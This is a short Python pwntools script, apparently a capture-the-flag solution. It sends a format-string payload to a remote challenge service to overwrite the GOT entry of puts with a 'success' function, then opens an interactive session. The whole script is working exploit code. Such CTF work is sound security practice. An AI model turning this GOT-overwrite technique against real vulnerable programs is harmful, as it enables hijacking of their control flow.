#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bin")
p = remote("ctf.example.org", 4405)

# petit cheatcode, pour exploiter facilement grace a pwnlib:
payload = fmtstr_payload(6, {exe.got["puts"]: exe.sym["success"]})

log.hexdump(payload)
p.sendlineafter(b"nom: ", payload)
p.interactive()
